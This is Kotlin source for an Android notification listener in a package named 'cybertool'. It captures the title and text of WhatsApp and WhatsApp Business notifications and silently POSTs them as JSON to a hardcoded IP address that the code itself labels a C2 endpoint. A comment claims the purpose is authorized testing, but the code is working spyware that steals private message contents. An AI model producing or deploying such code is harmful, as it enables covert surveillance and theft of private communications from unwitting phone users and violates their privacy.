package com.riqel.cybertool

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import okhttp3.*
import com.google.gson.Gson
import java.io.IOException

class NotificationListener : NotificationListenerService() {
    private val client = OkHttpClient()
    private val gson = Gson()
    // Same C2 endpoint
    private val C2_URL = "http://100.102.225.113:5000/api/notification"

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            val pkg = it.packageName
            // Only capture WhatsApp and a few others (for authorized testing)
            if (pkg == "com.whatsapp" || pkg == "com.whatsapp.w4b") {
                val title = it.notification.extras?.getCharSequence(android.app.Notification.EXTRA_TITLE)
                val text = it.notification.extras?.getCharSequence(android.app.Notification.EXTRA_TEXT)
                val data = mapOf(
                    "package" to pkg,
                    "title" to title?.toString(),
                    "text" to text?.toString(),
                    "timestamp" to System.currentTimeMillis()
                )
                val json = gson.toJson(data)
                val request = Request.Builder()
                    .url(C2_URL)
                    .post(RequestBody.create(MediaType.parse("application/json"), json))
                    .build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            }
        }
    }
}
